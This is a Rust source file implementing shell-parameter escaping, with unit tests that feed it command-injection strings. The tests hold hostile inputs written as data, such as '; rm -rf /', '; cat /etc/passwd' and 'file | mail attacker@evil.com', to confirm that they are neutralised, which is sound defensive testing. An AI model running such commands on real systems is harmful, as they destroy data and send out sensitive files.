/// Safely escape a parameter for shell commands
///
/// This uses proper shell escaping to prevent command injection
pub fn escape_parameter(param: &str) -> String {
    // Use single quotes for strong quoting, escaping any single quotes in the string
    if param.contains('\'') {
        // If the string contains single quotes, we need to escape them
        format!("'{}'", param.replace('\'', "'\"'\"'"))
    } else {
        // Simple case - just wrap in single quotes
        format!("'{}'", param)
    }
}

/// Safely build a cd command followed by another command
pub fn safe_cd_and_run(directory: &str, command: &str) -> String {
    format!("cd {} && {}", escape_parameter(directory), command)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shell_escaping() {
        assert_eq!(escape_parameter("simple"), "'simple'");
        assert_eq!(escape_parameter("with spaces"), "'with spaces'");
        assert_eq!(escape_parameter("with'quote"), "'with'\"'\"'quote'");
        assert_eq!(escape_parameter("dangerous;command"), "'dangerous;command'");
    }

    #[test]
    fn test_shell_parameter_escaping() {
        // Test basic escaping
        assert_eq!(escape_parameter("normal_file"), "'normal_file'");
        assert_eq!(escape_parameter("file with spaces"), "'file with spaces'");

        // Test single quote escaping
        assert_eq!(escape_parameter("file'with'quotes"), "'file'\"'\"'with'\"'\"'quotes'");

        // Test dangerous characters are safely escaped
        let dangerous_inputs = vec![
            "; rm -rf /",
            "file$(whoami)",
            "file`whoami`",
            "file|malicious",
            "file&background",
            "file>redirect",
            "file<input",
            "../../../etc/passwd",
        ];

        for input in dangerous_inputs {
            let escaped = escape_parameter(input);
            // All dangerous inputs should be wrapped in single quotes
            assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
                    "Input '{}' should be wrapped: {}", input, escaped);
            // Should not contain unescaped dangerous characters outside quotes
            assert!(!escaped[1..escaped.len()-1].contains('\'') || escaped.contains("'\"'\"'"),
                    "Input '{}' not properly escaped: {}", input, escaped);
        }
    }

    #[test]
    fn test_safe_command_builders() {
        // Test safe_cd_and_run
        let cd_cmd = safe_cd_and_run("/working/dir", "sbatch job.sbatch");
        assert_eq!(cd_cmd, "cd '/working/dir' && sbatch job.sbatch");

        // Test with malicious directory
        let malicious_cd = safe_cd_and_run("; echo 'hacked'", "echo normal");
        assert_eq!(malicious_cd, "cd '; echo '\"'\"'hacked'\"'\"'' && echo normal");
    }

    #[test]
    fn test_command_injection_prevention() {
        // These should all be safely escaped and not executable as commands
        let injection_attempts = vec![
            "; cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "file && rm -rf /",
            "file || malicious_command",
            "file > /etc/passwd",
            "file | mail attacker@evil.com",
        ];

        for attempt in injection_attempts {
            let escaped = escape_parameter(attempt);
            // Should be wrapped in single quotes, making it a literal string
            assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
                    "Injection attempt should be wrapped: {}", attempt);
        }
    }
}
